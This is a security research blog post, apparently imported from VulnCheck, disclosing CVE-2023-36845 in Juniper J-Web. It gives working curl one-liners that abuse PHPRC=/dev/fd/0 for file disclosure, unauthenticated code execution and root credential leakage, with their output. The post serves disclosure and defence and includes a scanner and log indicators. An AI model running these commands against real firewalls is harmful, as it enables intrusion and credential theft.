---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-09-18_fileless-remote-code-execution-on-juniper-firewalls.md
original_filename: 2023-09-18_fileless-remote-code-execution-on-juniper-firewalls.md
title: Fileless Remote Code Execution on Juniper Firewalls
category: documents
detected_topics:
- command-injection
- jwt
- file-upload
- otp
- rate-limit
- automation-abuse
tags:
- imported
- documents
- command-injection
- jwt
- file-upload
- otp
- rate-limit
- automation-abuse
language: en
raw_sha256: e120fe084ec6a6fd1dbf76870297bf340c836efd24beb7840cd17a9188c0c8df
text_sha256: 78f8413d4271c62029b7cfdf70feec447148e37df79b44aa276f5163e15e7d28
ingested_at: '2026-06-28T07:32:26Z'
sensitivity: unknown
redactions_applied: true
---

# Fileless Remote Code Execution on Juniper Firewalls

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-09-18_fileless-remote-code-execution-on-juniper-firewalls.md
- Source Type: markdown
- Detected Topics: command-injection, jwt, file-upload, otp, rate-limit, automation-abuse
- Ingested At: 2026-06-28T07:32:26Z
- Redactions Applied: True
- Raw SHA256: `e120fe084ec6a6fd1dbf76870297bf340c836efd24beb7840cd17a9188c0c8df`
- Text SHA256: `78f8413d4271c62029b7cfdf70feec447148e37df79b44aa276f5163e15e7d28`


## Content

---
title: "Fileless Remote Code Execution on Juniper Firewalls"
page_title: "Fileless Remote Code Execution on Juniper Firewalls  | Blog | VulnCheck"
url: "https://vulncheck.com/blog/juniper-cve-2023-36845"
final_url: "https://www.vulncheck.com/blog/juniper-cve-2023-36845"
authors: ["Jacob Baines (@Junior_Baines)"]
programs: ["Juniper"]
bugs: ["RCE"]
publication_date: "2023-09-18"
added_date: "2024-01-18"
source: "pentester.land/writeups.json"
original_index: 765
---

[CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845) is a PHP environment variable manipulation vulnerability affecting Juniper [SRX](https://www.juniper.net/us/en/products/security/srx-series.html) firewalls and [EX](https://www.juniper.net/us/en/products/switches/ex-series.html) switches. [Juniper scored](https://supportportal.juniper.net/s/article/2023-08-Out-of-Cycle-Security-Bulletin-Junos-OS-SRX-Series-and-EX-Series-Multiple-vulnerabilities-in-J-Web-can-be-combined-to-allow-a-preAuth-Remote-Code-Execution?language=en_US) the vulnerability as a medium severity issue. However, in this blog, we’ll show you how this vulnerability alone can achieve remote, unauthenticated code execution without even touching the disk.

## Key Takeaways

  * VulnCheck developed an exploit for CVE-2023-36845 that allows an unauthenticated and remote attacker to execute arbitrary code on Juniper firewalls without creating a file on the system.
  * Approximately 80% of affected internet-facing firewalls remain unpatched.
  * VulnCheck released a [vulnerability scanner](https://github.com/vulncheck-oss/cve-2023-36845-scanner) to identify firewalls vulnerable to CVE-2023-36845.

## Background

CVE-2023-36845 (see appendix for CVE clarification) was first described by [watchTowr](https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/) in a multi-step file upload [exploit](https://vulncheck.com/xdb/fcb027407d46) chain. In order to replicate their work, we purchased an ancient [SRX210](https://www.juniper.net/documentation/product/us/en/srx210/) from eBay. We quickly learned that the watchTowr exploit didn’t work on our device.

The first part of the watchTowr exploit chain uses [CVE-2023-36846](https://nvd.nist.gov/vuln/detail/CVE-2023-36846) to invoke a `do_fileUpload` function in the J-Web interface. This results in writing arbitrary files to `/var/tmp`. Unfortunately, our old SRX210’s J-Web doesn’t have the `do_fileUpload` functionality, so the exploit failed:
  
  
  $ curl http://10.12.72.1/webauth_operation.php -d 'rs=do_upload&rsargs[]=[{"fileName": "test.php", "fileData": ",PD9waHAgDQpwaHBpbmZvKCk7DQo/Pg==", "csize": 22}]'
  -:function not callable
  

Juniper targets are a delicious meal, though, so we weren’t going to be put off so easily. We began hunting for a secondary file upload mechanism or a new path to code execution. We did find a secondary file upload mechanism (see the appendix), but what we really want to share is a new path to code execution that doesn’t require a file upload at all.

## A File That Isn’t

watchTowr’s attack achieves code execution by uploading two files, setting the [PHPRC](https://www.php.net/manual/en/configuration.file.php) environment variable to one of those files, and then using the php.ini [auto_prepend_file](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file) setting to force every php page to load the second file. It’s a clever attack, but if you can’t upload a file, then what can you do? Use [stdin](https://en.wikipedia.org/wiki/Standard_streams#Standard_input_\(stdin\)), of course.

The Juniper firewalls use the [Appweb](https://www.embedthis.com/appweb/) web server. When Appweb invokes a CGI script, it passes a variety of environment variables and arguments so that the script can access the user’s HTTP request. The body of the HTTP request is passed via stdin. The affected firewalls run FreeBSD, and every FreeBSD process can access their stdin by opening `/dev/fd/0`. By sending an HTTP request, we’re able to introduce a “file”, `/dev/fd/0`, to the system.

Using that trick, we can set the PHPRC environment variable to `/dev/fd/0` and include the desired `php.ini` in our HTTP request. The following `curl` request demonstrates this attack to prepend `/etc/passwd` to every response.
  
  
  $ curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'
  root:*:0:0:Charlie &:/root:/bin/csh
  daemon:*:1:1:Owner of many system processes:/root:/sbin/nologin
  operator:*:2:5:System &:/:/sbin/nologin
  bin:*:3:7:Binaries Commands and Source:/:/sbin/nologin
  tty:*:4:65533:Tty Sandbox:/:/sbin/nologin
  kmem:*:5:65533:KMem Sandbox:/:/sbin/nologin
  games:*:7:13:Games pseudo-user:/usr/games:/sbin/nologin
  man:*:9:9:Mister Man Pages:/usr/share/man:/sbin/nologin
  sshd:*:22:22:Secure Shell Daemon:/var/empty:/sbin/nologin
  ext:*:39:39:External applications:/:/sbin/nologin
  bind:*:53:53:Bind Sandbox:/:/sbin/nologin
  uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/sbin/nologin
  nobody:*:65534:65534:Unprivileged user:/nonexistent:/sbin/nologin
  <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
  <html>
  <head>
  <meta http-equiv="Content-Type" content="text/html"/>
  <link rel="stylesheet" href="/stylesheet/juniper.css" type="text/css"/>
  <title>Log In - Juniper Web Device Manager</title>
  <link rel="shortcut icon" href='images/favicon.ico' type="image/x-icon"/>
  </head>
  

That’s a neat information leak (and we have another interesting one in the appendix), but it isn’t code execution. To achieve code execution, watchTowr used two files. One for the `php.ini` and one with arbitrary PHP. We can’t upload a second file, but we found a workaround for that as well.

## A Wild PHP Feature to the Rescue

`auto_prepend_file` is simple. It just causes the provided file to be added using the `require` function. The description from php.net:

> auto_prepend_file string Specifies the name of a file that is automatically parsed before the main file. The file is included as if it was called with the require function, so include_path is used.

For our attack, another PHP feature pairs well with `auto_prepend_file`. That feature is [allow_url_include](https://www.php.net/manual/en/filesystem.configuration.php#ini.allow-url-include):

> allow_url_include bool This option allows the use of URL-aware fopen wrappers with the following functions: include, include_once, require, require_once.

By enabling `allow_url_include`, we can use any [protocol wrapper](https://www.php.net/manual/en/wrappers.php) with `auto_prepend_file`. The obvious choice is `data://` to provide the “second file” inline. Below is an example of this attack that executes `<? phpinfo(); ?>` which is embedded in `data://`:
  
  
  $ curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'
  <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd">
  <html><head>
  <style type="text/css">
  body {background-color: #ffffff; color: #000000;}
  body, td, th, h1, h2 {font-family: sans-serif;}
  pre {margin: 0px; font-family: monospace;}
  a:link {color: #000099; text-decoration: none; background-color: #ffffff;}
  a:hover {text-decoration: underline;}
  table {border-collapse: collapse;}
  .center {text-align: center;}
  .center table { margin-left: auto; margin-right: auto; text-align: left;}
  .center th { text-align: center !important; }
  td, th { border: 1px solid #000000; font-size: 75%; vertical-align: baseline;}
  h1 {font-size: 150%;}
  h2 {font-size: 125%;}
  .p {text-align: left;}
  .e {background-color: #ccccff; font-weight: bold; color: #000000;}
  .h {background-color: #9999cc; font-weight: bold; color: #000000;}
  .v {background-color: #cccccc; color: #000000;}
  .vr {background-color: #cccccc; text-align: right; color: #000000;}
  img {float: right; border: 0px;}
  hr {width: 600px; background-color: #cccccc; border: 0px; height: 1px; color: #000000;}
  </style>
  <title>phpinfo()</title><meta name="ROBOTS" content="NOINDEX,NOFOLLOW,NOARCHIVE" /></head>
  <body><div class="center">
  

Just like that, by only using CVE-2023-36845, we’ve achieved unauthenticated and remote code execution without actually dropping a file on disk. Our private exploit establishes a reverse shell, but that’s quite trivial once you’ve reached this point.

## Real World Impact

[Shodan](https://www.shodan.io/search?query=title%3A%22Juniper%22+http.favicon.hash%3A2141724739) shows approximately 15,000 Juniper devices with internet-facing web interfaces (caution has to be taken when crafting this query because there are about the same amount of honeypots):

![Juniper J-Web on Shodan](/blog/juniper-cve-2023-36845/shodan-jweb.png)

We wrote a scanner that generates an error on affected systems by setting the LD_PRELOAD environment variable. We’ve made it available on [GitHub](https://github.com/vulncheck-oss/cve-2023-36845-scanner). On a representative sample size (n=3000), we found that 79% of the responding targets were unpatched. This is particularly troublesome since both [Shadowserver](https://x.com/Shadowserver/status/1696512418036486246) and GreyNoise have seen attackers probing the watchTowr endpoint (webauth_operation.php).

![Juniper attacker on Greynoise](/blog/juniper-cve-2023-36845/greynoise-webauth-operation.png)

Firewalls are interesting targets to APT as they help bridge into the protected network and can serve as useful hosts for C2 infrastructure. Anyone who has an unpatched Juniper firewall should examine it for signs of compromise. The `httpd.log` is particularly useful as it may contain tidbits like:

> httpd: 2: POST /?PHPRC=/dev/fd/0 HTTP/1.1

It’s worth noting that attackers can get around including variables in the HTTP header; we only did that here for clarity. For example, the information leak works just fine using multipart form data:
  
  
  $ curl "http://10.12.72.1/" -F $'auto_prepend_file="/etc/passwd\n"' -F 'PHPRC=/dev/fd/0'
  root:*:0:0:Charlie &:/root:/bin/csh
  daemon:*:1:1:Owner of many system processes:/root:/sbin/nologin
  operator:*:2:5:System &:/:/sbin/nologin
  bin:*:3:7:Binaries Commands and Source:/:/sbin/nologin
  tty:*:4:65533:Tty Sandbox:/:/sbin/nologin
  kmem:*:5:65533:KMem Sandbox:/:/sbin/nologin
  games:*:7:13:Games pseudo-user:/usr/games:/sbin/nologin
  man:*:9:9:Mister Man Pages:/usr/share/man:/sbin/nologin
  sshd:*:22:22:Secure Shell Daemon:/var/empty:/sbin/nologin
  ext:*:39:39:External applications:/:/sbin/nologin
  bind:*:53:53:Bind Sandbox:/:/sbin/nologin
  uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/sbin/nologin
  nobody:*:65534:65534:Unprivileged user:/nonexistent:/sbin/nologin
  <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
  <html>
  <head>
  <meta http-equiv="Content-Type" content="text/html"/>
  <link rel="stylesheet" href="/stylesheet/juniper.css" type="text/css"/>
  <title>Log In - Juniper Web Device Manager</title>
  <link rel="shortcut icon" href='images/favicon.ico' type="image/x-icon"/>
  </head>
  

When an attacker uses this form of attack, httpd.log (and all other logs as far as we can tell) are essentially useless. Determining if you’ve been compromised by a careful attacker will be quite difficult.

## Summary

In this blog, we demonstrated how CVE-2023-36845, a vulnerability flagged as “Medium” severity by Juniper, can be used to remotely execute arbitrary code without authentication. We’ve turned a multi-step (but very good) exploit into an exploit that can be written using a single curl command and appears to affect more (older) systems.

Additionally, we found that the vast majority of internet-facing Juniper systems remain vulnerable to this issue. There is some evidence of exploitation in the wild, and given how slow patching is going, we suspect this will be a useful exploit for attackers for quite some time.

## Appendix

### CVE Clarification

The original advisory published by Juniper ([2023-08](https://supportportal.juniper.net/s/article/2023-08-Out-of-Cycle-Security-Bulletin-Junos-OS-SRX-Series-and-EX-Series-Multiple-vulnerabilities-in-J-Web-can-be-combined-to-allow-a-preAuth-Remote-Code-Execution?language=en_US)), contains five CVE identifiers, but only two CVE descriptions (they are repeated between the five) and one (entirely erroneous) CVSSv3 score for all of the vulnerabilities. There is essentially no way to distinguish CVE-2023-36844 and CVE-2023-36845 from CVE-2023-36846, or CVE-2023-36847 from CVE-2023-36851. To be clear, this is not how CVE descriptions should work, and Juniper should do better.

watchtowr refers to CVE-2023-36845 and CVE-2023-36846 in their writeup, so, for consistency, we do as well.

### Secondary File Upload Mechanism

Our test system has the Appweb file upload mechanism enabled. An attacker could upload arbitrary files to `/var/tmp` like so:
  
  
  curl -v -F 'upload=@/tmp/php.ini' http://10.12.72.1/
  

On the firewall, a file will be created with the name of “MPR_%d_%d_%d.tmp”. Where the first %d is the httpd process ID. The second %d is a 16-bit number calculated using the current time, and the last %d is a one-up counter. These values are small enough that they could be brute-forced and used with the original watchTowr exploit.
  
  
  root@junSRX210% ls -l
  total 32
  -rw-r--r--  1 nobody  wheel 96 Sep 13 23:15 MPR_1479_59421_1.tmp
  root@junSRX210% cat MPR_1479_59421_1.tmp
  allow_url_include=On
  auto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="
  

## Root Credentials Disclosure

Using the file disclosure mechanism mentioned above, we are able to leak the root credentials as they were at configuration time. We have no idea if this works on even slightly modern Juniper, but it was a neat tidbit. There is a file called `wiz_config_server.txt` sitting in `/var/tmp/`. Here is a very truncated version that shows the `root` user password=***REDACTED*** curl -kv "http://10.12.72.1/about.php?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/var/tmp/wiz_config_server.txt"'
  *  Trying 10.12.72.1:80...
  * TCP_NODELAY set
  * Connected to 10.12.72.1 (10.12.72.1) port 80 (#0)
  > POST /about.php?PHPRC=/dev/fd/0 HTTP/1.1
  > Host: 10.12.72.1
  > User-Agent: curl/7.68.0
  > Accept: */*
  > Content-Length: 50
  > Content-Type: application/x-www-form-urlencoded
  >
  * upload completely sent off: 50 out of 50 bytes
  * Mark bundle as not supporting multiuse
  < HTTP/1.1 200 OK
  < Date: Wed, 13 Sep 2023 23:27:51 GMT
  < Server: Embedthis-Appweb/3.2.3
  < Cache-Control: no-cache
  < ETag: "1e0cc-40e-51b0b0ec"
  < Content-Type: text/html
  < Connection: keep-alive
  < Keep-Alive: timeout=120, max=199
  < Last-Modified: Wed, 13 Sep 2023 23:27:51 GMT
  < x-powered-by: PHP/5.3.2
  < Transfer-Encoding: chunked
  <
  …
  ",\\\"rootpassword\\\":\\\"labpass1\\\",
  …
